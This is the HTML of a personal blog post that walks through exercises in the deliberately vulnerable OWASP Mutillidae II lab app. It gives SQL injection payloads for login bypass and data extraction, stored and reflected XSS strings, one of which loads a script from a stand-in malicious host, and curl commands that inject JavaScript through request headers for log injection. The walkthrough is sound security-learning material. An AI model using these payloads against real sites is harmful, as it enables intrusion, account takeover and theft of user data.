@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang='en'><head>
+  <meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+<meta name='description' content='NOWASP (Mutillidae) is a free, open source, deliberately vulnerable web-application providing a target for web-security enthusiest.'>
+<meta name='theme-color' content='#ffcd00'>
+
+<meta property='og:title' content='Learning web app secuiry with OWASP Mutillidae II - part 1 • Home'>
+<meta property='og:description' content='NOWASP (Mutillidae) is a free, open source, deliberately vulnerable web-application providing a target for web-security enthusiest.'>
+<meta property='og:url' content='https://kowalcj0.github.io/2018/01/23/mutillidae-ii-part-1/'>
+<meta property='og:site_name' content='Home'>
+<meta property='og:type' content='article'><meta property='og:image' content='https://kowalcj0.github.io/img/2018/001/owasp_full_logo.png'><meta property='article:section' content='2018'><meta property='article:tag' content='security'><meta property='article:tag' content='owasp'><meta property='article:tag' content='mutillidae'><meta property='article:tag' content='pentesting'><meta property='article:published_time' content='2018-01-23T14:41:50&#43;01:00'/><meta property='article:modified_time' content='2018-01-23T14:41:50&#43;01:00'/><meta name='twitter:card' content='summary_large_image'><meta property='twitter:image' content='https://kowalcj0.github.io/img/2018/001/owasp_full_logo.png'><meta property='twitter:image:alt' content='OWASP logo. Source: secplicity.org'>
+
+<meta name="generator" content="Hugo 0.69.2" />
+
+  <title>Learning web app secuiry with OWASP Mutillidae II - part 1 • Home</title>
+  <link rel='canonical' href='https://kowalcj0.github.io/2018/01/23/mutillidae-ii-part-1/'>
+  
+  
+  <link rel='icon' href='/img/favicon144.ico'>
+<link rel='stylesheet' href='/assets/css/main.ab98e12b.css'><link rel='stylesheet' href='/css/syntax.css'><link rel='stylesheet' href='/css/custom.css'><style>
+:root{--color-accent:#ffcd00;}
+</style>
+
+  
+
+</head>
+<body class='page type-2018 has-cover has-sidebar'>
+
+  <div class='site'><div id='sidebar' class='sidebar'>
+  <a class='screen-reader-text' href='#main-menu'>Skip to Main Menu</a>
+
+  <div class='container'><section class='widget widget-about sep-after'>
+  <header>
+    
+    <div class='logo'>
+      <a href='/'>
+        <img src='/img/logo.png'>
+      </a>
+    </div>
+    
+    <h2 class='title site-title '>
+      <a href='/'>
+      Free yourself, help to free me, free us
+      </a>
+    </h2>
+    <div class='desc'>
+    notes, scribbles, thoughts etc.
+    </div>
+  </header>
+
+</section>
+<section class='widget widget-search sep-after'>
+  <header>
+    <h4 class='title widget-title'>Search</h4>
+  </header>
+
+  <form action='/search' id='search-form' class='search-form'>
+    <label>
+      <span class='screen-reader-text'>Search</span>
+      <input id='search-term' class='search-term' type='search' name='q' placeholder='Search&hellip;'>
+    </label></form>
+
+</section>
+<section class='widget widget-taxonomy_cloud sep-after'>
+  <header>
+    <h4 class='title widget-title'>Categories</h4>
+  </header>
+
+  <div class='container list-container'>
+  <ul class='list taxonomy-cloud no-shuffle'><li>
+        <a href='/categories/food/' style='font-size:1em'>food</a>
+      </li><li>
+        <a href='/categories/hugo/' style='font-size:1em'>hugo</a>
+      </li><li>
+        <a href='/categories/learning/' style='font-size:1.875em'>learning</a>
+      </li><li>
+        <a href='/categories/movies/' style='font-size:1.125em'>movies</a>
+      </li><li>
+        <a href='/categories/security/' style='font-size:2em'>security</a>
+      </li><li>
+        <a href='/categories/unix/' style='font-size:2em'>unix</a>
+      </li><li>
+        <a href='/categories/web/' style='font-size:1em'>web</a>
+      </li></ul>
+</div>
+
+
+</section>
+<section class='widget widget-taxonomy_cloud sep-after'>
+  <header>
+    <h4 class='title widget-title'>Tags</h4>
+  </header>
+
+  <div class='container list-container'>
+  <ul class='list taxonomy-cloud no-shuffle'><li>
+        <a href='/tags/1959/' style='font-size:1em'>1959</a>
+      </li><li>
+        <a href='/tags/android/' style='font-size:1em'>android</a>
+      </li><li>
+        <a href='/tags/bash/' style='font-size:1em'>bash</a>
+      </li><li>
+        <a href='/tags/bof/' style='font-size:1em'>BoF</a>
+      </li><li>
+        <a href='/tags/castnow/' style='font-size:1em'>castnow</a>
+      </li><li>
+        <a href='/tags/cli/' style='font-size:1em'>cli</a>
+      </li><li>
+        <a href='/tags/codecs/' style='font-size:1em'>codecs</a>
+      </li><li>
+        <a href='/tags/conference/' style='font-size:1em'>conference</a>
+      </li><li>
+        <a href='/tags/criterion-collection/' style='font-size:1em'>criterion collection</a>
+      </li><li>
+        <a href='/tags/dbus/' style='font-size:1em'>dbus</a>
+      </li><li>
+        <a href='/tags/dos/' style='font-size:1em'>DoS</a>
+      </li><li>
+        <a href='/tags/drama/' style='font-size:1em'>drama</a>
+      </li><li>
+        <a href='/tags/driver/' style='font-size:1em'>driver</a>
+      </li><li>
+        <a href='/tags/enumeration/' style='font-size:1em'>enumeration</a>
+      </li><li>
+        <a href='/tags/ethical-hacking/' style='font-size:1.8571428571428572em'>ethical hacking</a>
+      </li><li>
+        <a href='/tags/fedora/' style='font-size:1em'>fedora</a>
+      </li><li>
+        <a href='/tags/ffmpeg/' style='font-size:1.1428571428571428em'>ffmpeg</a>
+      </li><li>
+        <a href='/tags/freebsd/' style='font-size:1em'>freebsd</a>
+      </li><li>
+        <a href='/tags/freenas/' style='font-size:1em'>freenas</a>
+      </li><li>
+        <a href='/tags/fun/' style='font-size:1em'>fun</a>
+      </li><li>
+        <a href='/tags/gnome/' style='font-size:1em'>gnome</a>
+      </li><li>
+        <a href='/tags/intel/' style='font-size:1em'>intel</a>
+      </li><li>
+        <a href='/tags/ios/' style='font-size:1em'>iOS</a>
+      </li><li>
+        <a href='/tags/japanese/' style='font-size:1em'>japanese</a>
+      </li><li>
+        <a href='/tags/linux/' style='font-size:2em'>linux</a>
+      </li><li>
+        <a href='/tags/logrotate/' style='font-size:1em'>logrotate</a>
+      </li><li>
+        <a href='/tags/mobile/' style='font-size:1em'>mobile</a>
+      </li><li>
+        <a href='/tags/mpd/' style='font-size:1em'>mpd</a>
+      </li><li>
+        <a href='/tags/mpv/' style='font-size:1em'>mpv</a>
+      </li><li>
+        <a href='/tags/mutillidae/' style='font-size:1em'>mutillidae</a>
+      </li><li>
+        <a href='/tags/notes/' style='font-size:1.8571428571428572em'>notes</a>
+      </li><li>
+        <a href='/tags/owasp/' style='font-size:1em'>owasp</a>
+      </li><li>
+        <a href='/tags/pentesting/' style='font-size:2em'>pentesting</a>
+      </li><li>
+        <a href='/tags/python/' style='font-size:1em'>python</a>
+      </li><li>
+        <a href='/tags/qt/' style='font-size:1em'>qt</a>
+      </li><li>
+        <a href='/tags/root/' style='font-size:1em'>root</a>
+      </li><li>
+        <a href='/tags/rss/' style='font-size:1em'>rss</a>
+      </li><li>
+        <a href='/tags/security/' style='font-size:2em'>security</a>
+      </li><li>
+        <a href='/tags/seo/' style='font-size:1em'>seo</a>
+      </li><li>
+        <a href='/tags/smoothie/' style='font-size:1em'>smoothie</a>
+      </li><li>
+        <a href='/tags/sniffers/' style='font-size:1em'>sniffers</a>
+      </li><li>
+        <a href='/tags/syntax/' style='font-size:1em'>syntax</a>
+      </li><li>
+        <a href='/tags/vlc/' style='font-size:1em'>vlc</a>
+      </li><li>
+        <a href='/tags/war/' style='font-size:1em'>war</a>
+      </li><li>
+        <a href='/tags/wayland/' style='font-size:1em'>wayland</a>
+      </li><li>
+        <a href='/tags/wifi/' style='font-size:1em'>wifi</a>
+      </li><li>
+        <a href='/tags/zfs/' style='font-size:1em'>zfs</a>
+      </li></ul>
+</div>
+
+
+</section>
+</div>
+
+  <div class='sidebar-overlay'></div>
+</div><div class='main'><nav id='main-menu' class='menu main-menu' aria-label='Main Menu'>
+  <div class='container'>
+    <a class='screen-reader-text' href='#content'>Skip to Content</a>
+
+<button id='sidebar-toggler' class='sidebar-toggler' aria-controls='sidebar'>
+  <span class='screen-reader-text'>Toggle Sidebar</span>
+  <span class='open'><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <line x1="3" y1="12" x2="21" y2="12" />
+  <line x1="3" y1="6" x2="21" y2="6" />
+  <line x1="3" y1="18" x2="21" y2="18" />
+  
+</svg>
+</span>
+  <span class='close'><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <line x1="18" y1="6" x2="6" y2="18" />
+  <line x1="6" y1="6" x2="18" y2="18" />
+  
+</svg>
+</span>
+</button>
+    <ul><li class='item'>
+        <a href='/general/worth-watching/'>Worth watching</a>
+      </li><li class='item'>
+        <a href='https://github.com/kowalcj0/kowalcj0.github.io'>Repo</a>
+      </li></ul>
+  </div>
+</nav><div class='header-widgets'>
+        <div class='container'>
+    
+    <style>.widget-breadcrumbs li:after{content:'\2f '}</style>
+  <section class='widget widget-breadcrumbs sep-after'>
+    <nav id='breadcrumbs'>
+      <ol><li><a href='/'>Home</a></li><li><a href='/2018/'>2018</a></li><li><span>Learning web app secuiry with OWASP Mutillidae II - part 1</span></li></ol>
+    </nav>
+  </section></div>
+      </div>
+
+      <header id='header' class='header site-header'>
+        <div class='container sep-after'>
+          <div class='header-info'><p class='site-title title'>Home</p><p class='desc site-desc'>notes, scribbles, thoughts etc.</p>
+          </div>
+        </div>
+      </header>
+
+      <main id='content'>
+
+
+<article lang='en' class='entry'>
+  <header class='header entry-header'>
+  <div class='container sep-after'>
+    <div class='header-info'>
+      <h1 class='title'>Learning web app secuiry with OWASP Mutillidae II - part 1</h1>
+      
+<p class='desc'>NOWASP (Mutillidae) is a free, open source, deliberately vulnerable web-application providing a target for web-security enthusiest.</p>
+
+
+    </div>
+    <div class='entry-meta'>
+  <span class='posted-on'><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"/>
+  <line x1="16" y1="2" x2="16" y2="6"/>
+  <line x1="8" y1="2" x2="8" y2="6"/>
+  <line x1="3" y1="10" x2="21" y2="10"/>
+  
+</svg>
+<span class='screen-reader-text'>Posted on </span>
+  <time class='entry-date' datetime='2018-01-23T14:41:50&#43;01:00'>2018-01-23</time>
+</span>
+
+  
+  
+<span class='reading-time'><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <circle cx="12" cy="12" r="10"/>
+  <polyline points="12 6 12 12 15 15"/>
+  
+</svg>
+2 mins read
+</span>
+
+
+</div>
+
+
+  </div>
+</header>
+
+  <div class='entry-cover'>
+  <figure class='container cover-normal'>
+    <img src='/img/2018/001/owasp_full_logo.png' alt='OWASP logo. Source: secplicity.org'/>
+    
+      
+      <figcaption class='container'>
+        <span>OWASP logo. Source: <a href="https://www.secplicity.org/2017/04/12/owasp-top-10-web-application-security-update/">secplicity.org</a></span>
+      </figcaption>
+      
+    
+  </figure>
+</div>
+  
+
+  <div class='container entry-content'>
+  <h1 id="installation">iNSTALLATION<a href="#installation" class="header-anchor" ariaLabel="Anchor"><img src="/img/Octicons-link.svg"/></a></h1>
+<p>Run <code>nowasp</code> container:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker run -p 8888:80 -p 3306:3306 citizenstig/nowasp
+</code></pre></div><p>Go to <a href="http://localhost:8888/">http://localhost:8888/</a>, and build the DB.</p>
+<h1 id="excercices">eXCERCICES:<a href="#excercices" class="header-anchor" ariaLabel="Anchor"><img src="/img/Octicons-link.svg"/></a></h1>
+<h2 id="owasp-2013">OWASP 2013<a href="#owasp-2013" class="header-anchor" ariaLabel="Anchor"><img src="/img/Octicons-link.svg"/></a></h2>
+<h3 id="a1---injection-sql---sqli-extract-data---user-info">A1 - Injection (SQL) - SQLi Extract data - User info<a href="#a1---injection-sql---sqli-extract-data---user-info" class="header-anchor" ariaLabel="Anchor"><img src="/img/Octicons-link.svg"/></a></h3>
+<p>Submit the form with such query in the <code>Name</code> field:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39;-- AND &#39;</span>password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;password&#39;</span>
+</code></pre></div><p>Response should contain:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">Username=admin
+Password=adminpass
+Signature=g0t r00t?
+</code></pre></div><h3 id="a1---injection-sql---sqli-bypass-authentication---login">A1 - Injection (SQL) - SQLi Bypass authentication - Login<a href="#a1---injection-sql---sqli-bypass-authentication---login" class="header-anchor" ariaLabel="Anchor"><img src="/img/Octicons-link.svg"/></a></h3>
+<p>You can use the same query in the <code>Name</code> field:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39;-- AND &#39;</span>password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;password&#39;</span>
+</code></pre></div><p>After submitting the query you should see that you&rsquo;re logged in as&hellip;:</p>
+<pre><code>Logged In Admin: admin (g0t r00t?)
+</code></pre><h3 id="a1---injection-sql---sqli-insert-injection---add-to-your-blog">A1 - Injection (SQL) - SQLi Insert Injection - Add to your blog<a href="#a1---injection-sql---sqli-insert-injection---add-to-your-blog" class="header-anchor" ariaLabel="Anchor"><img src="/img/Octicons-link.svg"/></a></h3>
+<p><em>Stored Cross-Site Scripting</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://malicious.site.com/bad.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</code></pre></div><p>Once saved, check your browser&rsquo;s Network requests using e.g. Developer tools:</p>
+<div class="gallery" itemscope itemtype="http://schema.org/ImageGallery">
+
+<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <a href="/img/2018/001/OWASP-2013-A1-Add_to_your_blog-Stored_Cross-Site_Scripting.png" data-size="1311x204" itemprop="contentUrl"> 
+        <img itemprop="thumbnail"
+            src="/img/2018/001/OWASP-2013-A1-Add_to_your_blog-Stored_Cross-Site_Scripting-thumb.png"
+            alt="Stored Cross-Site Scripting"
+            />
+    </a>
+    
+    <figcaption>
+        
+        
+        <p>
+        Stored Cross-Site Scripting
+        
+        </p>
+        
+    </figcaption>
+    
+</figure>
+
+
+<div class="title">Stored Cross-Site Scripting</div>
+</div>
+<link rel="stylesheet" href="/css/pswp-gallery.css" />
+
+<p>get MySQL version:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39;+SUBSTRING(@@version,1,10)+&#39;</span>
+</code></pre></div><p>Red herrings: queries that don&rsquo;t fail but don&rsquo;t give much info back:
+<pre><code class="language-sqk" data-lang="sqk">&#39;+(SELECT IF(1=1,&#39;true&#39;,&#39;false&#39;))+&#39;
+&#39;+(SELECT password FROM accounts WHERE username=&#34;root&#34;)+&#39;
+&#39;+SUBSTRING((SELECT password FROM accounts WHERE username=&#34;root&#34;),1,10)+&#39;
+&#39;+(SELECT table_name FROM information_schema.tables WHERE table_schema = &#34;nowasp.accounts&#34;)+&#39;
+&#39;+(SELECT column_name FROM information_schema.columns WHERE table_schema = &#34;nowasp.accounts&#34;)+&#39;
+&#39;+SUBSTRING(SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = &#34;nowasp.accounts&#34;,1,50)+&#39;
+&#39;+SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name=&#34;accounts&#34;),1,50)+&#39;
+aaa&#39;, now()); SELECT * FROM accounts; --
+aaa&#39;, IF(1=1,&#39;true&#39;,&#39;false&#39;));#
+aaa&#39;, IF(1=1, SELECT * FROM members, &#39;false&#39;));#
+&#39;+ (SELECT password FROM accounts WHERE login=&#39;admin&#39; ) +&#39;
+&#39;+(SELECT password FROM members WHERE login=&#34;admin&#34;)+&#39;
+&#39;+(SELECT IF(1=1,&#39;true&#39;,&#39;false&#39;))+&#39;
+admin&#39;-- AND SELECT * FROM accounts;</code></pre></p>
+<h3 id="a1---injection-sql---sqli-insert-injection---register-for-an-account">A1 - Injection (SQL) - SQLi Insert Injection - Register for an Account<a href="#a1---injection-sql---sqli-insert-injection---register-for-an-account" class="header-anchor" ariaLabel="Anchor"><img src="/img/Octicons-link.svg"/></a></h3>
+<p>HTMLi -
+add this to the registration signature:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">CANARY</span><span style="color:#960050;background-color:#1e0010">={}&#34;&#34;()&#39;&#39;;#$</span><span style="color:#a6e22e">--</span>/&gt;1
+</code></pre></div><p>or you can use it to plant some XSS:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">CANARY</span><span style="color:#960050;background-color:#1e0010">={}&#34;&#34;()&#39;&#39;;#$</span><span style="color:#a6e22e">--</span>/&gt;&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;welcome&#34;</span>);&lt;/<span style="color:#f92672">script</span>&gt;
+</code></pre></div><p>Then log in as newly created user and see that <code>1</code> is visible next to the user name in top menu:</p>
+<div class="gallery" itemscope itemtype="http://schema.org/ImageGallery">
+
+<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <a href="/img/2018/001/OWASP-2013-A1-Add_to_your_blog-HTMLi.png" data-size="1419x559" itemprop="contentUrl"> 
+        <img itemprop="thumbnail"
+            src="/img/2018/001/OWASP-2013-A1-Add_to_your_blog-HTMLi-thumb.png"
+            alt="HTMLi"
+            />
+    </a>
+    
+    <figcaption>
+        
+        
+        <p>
+        HTMLi
+        
+        </p>
+        
+    </figcaption>
+    
+</figure>
+
+
+<div class="title">HTMLi</div>
+</div>
+<link rel="stylesheet" href="/css/pswp-gallery.css" />
+
+
+<link rel="stylesheet" href="/css/photoswipe.min.css" integrity="sha256-rlldBDOCxqXAE1fRopHG2SqpgWisq17/3Oleo+1CBKo=">
+<link rel="stylesheet" href="/css/photoswipe-default-skin.min.css" integrity="sha256-kQW7k22C0skJMSPxgEI2VHR0LPHeygi8SRYNvV/DB2w=">
+<script src="/js/photoswipe.min.js" integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="></script>
+<script src="/js/photoswipe-ui-default.min.js" integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="></script>
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+<script src="/js/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="></script>
+<script src="/js/pswp-init.js"></script>
+
+
+<h3 id="a1---injection-sql---sqli-insert-injection---view-captured-data">A1 - Injection (SQL) - SQLi Insert Injection - View Captured Data<a href="#a1---injection-sql---sqli-insert-injection---view-captured-data" class="header-anchor" ariaLabel="Anchor"><img src="/img/Octicons-link.svg"/></a></h3>
+<p>Here&rsquo;s one of my favs: <code>Application Log Injection</code>:<br>
+You can send a dummy HTTP request with <code>User-Agent</code> header containing JS:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#34;http://localhost:8888/index.php?page=register.php&#34;</span> -H <span style="color:#e6db74">&#34;User-Agent: &lt;script&gt;alert(&#39;pwnd with Application Log Injection&#39;);&lt;/script&gt;&#34;</span>  &amp;&gt; /dev/null
+</code></pre></div><p>or abuse the fact that the <code>endpoint</code> part of the URL is interpretted and logged so that we can include JS in it:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#34;http://localhost:8888/&lt;script&gt;alert(&#39;query_param&#39;);&lt;/script&gt;&#34;</span> &amp;&gt; /dev/null
+</code></pre></div><p>Once you send the request, then go to the <a href="http://localhost:8888/index.php?page=show-log.php">http://localhost:8888/index.php?page=show-log.php</a> the alert pop-ups will appear.</p>
+<p><em>NOTES:</em></p>
+<ul>
+<li>can you create an account for <code>root</code> user???</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#34;http://localhost:8888/index.php?page=capture-data.php&amp;showhints=1&#34;</span> -H <span style="color:#e6db74">&#34;PHPSESSID: 5hdie94hhe7cc50pqsbvujqkb3&#34;</span>
+</code></pre></div>
+
+</div>
+
+  
+<footer class='entry-footer'>
+  <div class='container sep-before'><div class='categories'><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <path d="M22,19a2,2,0,0,1-2,2H4a2,2,0,0,1-2-2V5A2,2,0,0,1,4,3H9l2,3h9a2,2,0,0,1,2,2Z"/>
+  
+</svg>
+<span class='screen-reader-text'>Categories: </span><a class='category' href='/categories/security/'>security</a>, <a class='category' href='/categories/learning/'>learning</a></div>
+<div class='tags'><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <path d="M20.59,13.41l-7.17,7.17a2,2,0,0,1-2.83,0L2,12V2H12l8.59,8.59A2,2,0,0,1,20.59,13.41Z"/>
+  <line x1="7" y1="7" x2="7" y2="7"/>
+  
+</svg>
+<span class='screen-reader-text'>Tags: </span><a class='tag' href='/tags/pentesting/'>pentesting</a>, <a class='tag' href='/tags/security/'>security</a>, <a class='tag' href='/tags/mutillidae/'>mutillidae</a>, <a class='tag' href='/tags/owasp/'>owasp</a></div>
+
+  </div>
+</footer>
+
+
+</article>
+
+<nav class='entry-nav'>
+  <div class='container'><div class='next-entry sep-before'>
+      <a href='/2018/01/27/syntax-highlighting-in-hugo/'>
+        <span class='screen-reader-text'>Next post: </span>Syntax Highlighting in Hugo<span aria-hidden='true'>Next <svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <line x1="4" y1="12" x2="20" y2="12"/>
+  <polyline points="14 6 20 12 14 18"/>
+  
+</svg>
+</span>
+      </a>
+    </div></div>
+</nav>
+
+
+
+
+      </main>
+
+      <footer id='footer' class='footer'>
+        <div class='container sep-before'><section class='widget widget-social_menu sep-after'><nav aria-label='Social Menu'>
+    <ul><li>
+        <a href='https://github.com/kowalcj0' target='_blank' rel='noopener'>
+          <span class='screen-reader-text'>Open Github account in new tab</span><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/>
+  
+</svg>
+</a>
+      </li><li>
+        <a href='https://twitter.com/januszkowalczyk' target='_blank' rel='noopener'>
+          <span class='screen-reader-text'>Open Twitter account in new tab</span><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"/>
+  
+</svg>
+</a>
+      </li></ul>
+  </nav>
+</section><div class='copyright'>
+  <p> &copy; 2018-2020 kowalcj0 </p>
+</div>
+
+        </div>
+      </footer>
+
+    </div>
+  </div><script>window.__assets_js_src="/assets/js/"</script>
+
+<script src='/assets/js/main.c3bcf2df.js'></script>
+
+</body>
+
+</html>
+
